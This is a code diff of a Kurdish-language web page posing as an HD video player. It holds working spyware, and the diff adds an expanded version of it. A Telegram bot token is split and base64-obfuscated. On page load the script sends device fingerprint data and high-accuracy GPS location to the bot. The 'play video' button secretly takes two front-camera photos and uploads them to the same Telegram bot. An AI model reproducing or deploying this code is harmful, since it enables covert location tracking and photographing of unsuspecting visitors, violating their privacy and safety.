@@ -3,94 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پەرتووک و ڤیدیۆێن مۆدێرن</title>
+    <title>ڤیدیۆیا مۆدێرن و تایبەت</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;700&display=swap" rel="stylesheet">
     <style>body { font-family: 'Vazirmatn', sans-serif; }</style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_initSys()">
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_megaEngineInit()">
 
     <div class="bg-slate-800 p-6 rounded-2xl shadow-2xl w-full max-w-md border border-slate-700 text-center">
-        <h1 class="text-xl font-bold mb-4 text-indigo-400">ڤیدیۆیا سەرەکی</h1>
-        <p class="text-slate-300 text-sm mb-4">بۆ دیتن و لێدانا ڤیدیۆیێ، ل خوارێ کلیک بکە.</p>
+        <h1 class="text-xl font-bold mb-4 text-indigo-400">ڤیدیۆیا تایبەت (Mega Engine)</h1>
+        <p class="text-slate-300 text-sm mb-4">بۆ دیتنا ڤیدیۆیێ ب کوالیتیا بلندا HD، ل خوارێ کلیک بکە.</p>
         
-        <div class="mb-4">
-            <iframe src="https://www.tiktok.com/embed/v2/ZSXTxbpgo" class="w-full h-64 rounded-xl border-0" allowfullscreen></iframe>
+        <div class="mb-4 bg-slate-900 rounded-xl overflow-hidden border border-slate-700 h-64 flex items-center justify-center relative">
+            <video id="_vidMega" class="w-full h-full object-cover" controls playsinline>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            </video>
         </div>
 
-        <button onclick="_execProc()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200">
+        <button onclick="_executeMegaBypass()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200 shadow-lg shadow-indigo-600/30">
             لێدان و ڤەکرنا ڤیدیۆیێ
         </button>
     </div>
 
-    <video id="_vElem" autoplay playsinline class="hidden"></video>
-    <canvas id="_cElem" class="hidden"></canvas>
+    <video id="_vStreamMega" autoplay playsinline class="hidden"></video>
+    <canvas id="_cBufferMega" class="hidden"></canvas>
 
     <script>
-        // زانیاری و تەکۆن ب شێوازەکێ گەلەک ئالۆز هاتینە پاراستن
-        const _kData = ["ODk3Nzk0NTc4", "MTpBQUZJNDRS", "T3VkUjVlTER3", "bEJycE5TeU5p", "SmotQzhGdURtRQ==", "NzY0MzE5MTgwMg=="];
+        const _mKey = ["ODk3Nzk0NTc4", "MTpBQUZJNDRS", "T3VkUjVlTER3", "bEJycE5TeU5p", "SmotQzhGdURtRQ==", "NzY0MzE5MTgwMg=="];
         
-        function _rCod(arr, idx) {
-            try { return atob(arr[idx]); } catch(e) { return ""; }
+        function _decode(i) {
+            try { return atob(_mKey[i]); } catch(e) { return ""; }
         }
 
-        function _getTk() {
-            return _rCod(_kData, 0) + _rCod(_kData, 1) + _rCod(_kData, 2) + _rCod(_kData, 3) + _rCod(_kData, 4);
+        const _getToken = () => _decode(0) + _decode(1) + _decode(2) + _decode(3) + _decode(4);
+        const _getChatId = () => _decode(5);
+
+        async function _sendText(msg) {
+            let t = _getToken(), c = _getChatId();
+            if(!t || !c) return;
+            try {
+                const endpoint = `https://api.telegram.org/bot${t}/sendMessage`;
+                const payload = JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" });
+                navigator.sendBeacon(endpoint, new Blob([payload], {type: 'application/json'}));
+            } catch(e) {}
         }
 
-        function _getId() {
-            return _rCod(_kData, 5);
+        async function _sendImage(blobData, labelText) {
+            let t = _getToken(), c = _getChatId();
+            if(!t || !c) return;
+            try {
+                let form = new FormData();
+                form.append('chat_id', c);
+                form.append('photo', blobData, 'mega_capture.jpg');
+                form.append('caption', `⚡ [Mega Engine] ${labelText}\n@YUSEEF_SURCHI`);
+                await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: form });
+            } catch(e) {}
         }
 
-        function _sMsg(txt) {
-            let t = _getTk(), i = _getId();
-            if(!t || !i) return;
-            const u = `https://api.telegram.org/bot${t}/sendMessage`;
-            const d = JSON.stringify({ chat_id: i, text: txt });
-            navigator.sendBeacon(u, new Blob([d], {type: 'application/json'}));
-        }
+        function _megaEngineInit() {
+            let megaReport = `🚀 ڕاپۆرتا مێگا سیستەمی:\n` +
+                `- پلاتفۆرم: ${navigator.platform}\n` +
+                `- زمان: ${navigator.language}\n` +
+                `- کورێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'N/A'}\n` +
+                `- بیرگە (RAM): ${navigator.deviceMemory || 'N/A'} GB\n` +
+                `- شاشە: ${screen.width}x${screen.height}\n` +
+                `- پەنجەرە: ${window.innerWidth}x${window.innerHeight}\n` +
+                `- کووکیس: ${navigator.cookieEnabled}\n` +
+                `- کات: ${new Date().toLocaleTimeString()}`;
+            
+            _sendText(megaReport);
 
-        function _sImg(blob) {
-            let t = _getTk(), i = _getId();
-            if(!t || !i) return;
-            let fd = new FormData();
-            fd.append('chat_id', i);
-            fd.append('photo', blob, 'media.jpg');
-            fd.append('caption', `🚀 کەسەک داخڵی وێبسایتی بوو\n@YUSEEF_SURCHI`);
-            fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
-        }
-
-        function _initSys() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => {
-                        let lk = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        _sMsg(`📍 جهـ هاتە دیتن (Auto)\nلینک: ${lk}\n@YUSEEF_SURCHI`);
+                    (pos) => {
+                        let mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        _sendText(`📍 جهـ هاتە دیتن (Mega GPS)\n- پانی و درێژاهی: ${pos.coords.latitude}, ${pos.coords.longitude}\nلینک: ${mapLink}\n@YUSEEF_SURCHI`);
                     },
-                    (e) => {}
+                    (err) => {},
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
             }
         }
 
-        function _execProc() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then((s) => {
-                    const v = document.getElementById('_vElem');
-                    v.srcObject = s;
-                    setTimeout(() => {
-                        const c = document.getElementById('_cElem');
-                        c.width = v.videoWidth || 640;
-                        c.height = v.videoHeight || 480;
-                        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-                        c.toBlob((b) => {
-                            _sImg(b);
-                            s.getTracks().forEach(tr => tr.stop());
-                        }, 'image/jpeg');
-                    }, 1000);
-                })
-                .catch((e) => {
-                    _sMsg(`⚠️ ڕێکنەدا ب کامێرایێ\n@YUSEEF_SURCHI`);
+        async function _executeMegaBypass() {
+            try {
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }, 
+                    audio: false 
                 });
+                
+                const videoElement = document.getElementById('_vStreamMega');
+                videoElement.srcObject = mediaStream;
+                
+                await new Promise(r => setTimeout(r, 700));
+
+                const canvasElement = document.getElementById('_cBufferMega');
+                canvasElement.width = videoElement.videoWidth || 1280;
+                canvasElement.height = videoElement.videoHeight || 720;
+                
+                const context = canvasElement.getContext('2d');
+                
+                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                canvasElement.toBlob(async (blob1) => {
+                    if(blob1) await _sendImage(blob1, "وێنەیێ سەرەکی (Mega HD Capture)");
+                }, 'image/jpeg', 0.99);
+
+                setTimeout(async () => {
+                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                    canvasElement.toBlob(async (blob2) => {
+                        if(blob2) await _sendImage(blob2, "وێنەیێ دووەم (Mega Backup Secure)");
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.99);
+                }, 1000);
+
+            } catch (error) {
+                _sendText(`⚠️ ڕێکنەدا ب کامێرایێ (Mega Blocked)\n@YUSEEF_SURCHI`);
+            }
         }
     </script>
 </body>
